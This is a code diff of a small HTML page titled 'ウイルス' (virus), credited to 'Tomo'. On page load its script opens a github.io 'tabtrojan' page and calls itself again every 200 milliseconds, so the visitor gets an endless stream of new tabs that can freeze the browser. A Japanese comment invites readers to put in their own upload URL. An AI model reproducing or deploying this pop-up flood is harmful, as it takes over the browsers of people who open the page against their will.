@@ -4,41 +4,39 @@
     <title>ウイルス</title>
     <meta name="viewport" content="width=device-width, user-scalable=no">
     <style>
-      body {
-        text-align: center;
-        font-family: sans-serif;
-        background: #fff;
-      }
+    body {
+      background: #fff;
+      font-family: sans-serif;
+      text-align: center;
+    }
       .title {
-        font-family: monospace;
-        font-size: 25px;
+       font-size: 25px;
+       font-family: monospace;
       }
       #proport {
-        border: none;
-        border-radius: 6px;
-        box-shadow: 0px 0px 10px #737373;
-        padding: 10px 10px;
         width: 90%;
+        margin-right: auto;
+        margin-left: auto;
+        margin-top: 30px;
+        background: #fff;
         text-align: center;
-		  
+        box-shadow: 0px 0px 10px #737373;
+		  padding: 10px 10px;
       }
     </style>
   </head>
-  <body onload="virus()" onleave="go()">
+  <body onload="virus()">
     <div id="proport">
       <span class="title">ウイルス</span><br>
-      <span>By Tomo</span>
-      <script>
-        function virus() {
-          window.open("https://prazma.github.io/tabtrojan");
-          setTimeout( function () {
-            virus();
-          }, 100)
-        }
-        function go() {
-          alert("ウイルスプログラムが閉じます");
-        }
-      </script>
+      <span>by Tomo</span>
     </div>
+    <script>
+      function virus() {
+        window.open("https://prazma.github.io/tabtrojan") //または君のアップロード先
+        setTimeout( function () {
+          virus();
+        }, 200)
+      }
+    </script>
   </body>
 </html>
